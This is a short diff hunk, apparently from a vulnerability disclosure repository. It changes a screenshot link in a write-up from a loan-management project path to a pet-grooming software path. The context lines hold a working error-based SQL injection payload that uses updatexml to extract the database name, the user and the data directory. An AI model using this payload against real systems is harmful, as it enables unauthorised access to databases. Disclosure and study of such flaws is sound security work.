@@ -50,4 +50,4 @@ id=1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#
 
 payload:`id=1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#`
 
-![image](https://github.com/joinia/webray.com.cn/blob/main/Loan-Management-System/images/sqlbarcode.png)
+![image](https://github.com/joinia/webray.com.cn/blob/main/Pet-grooming-management-software/images/sqlbarcode.png)
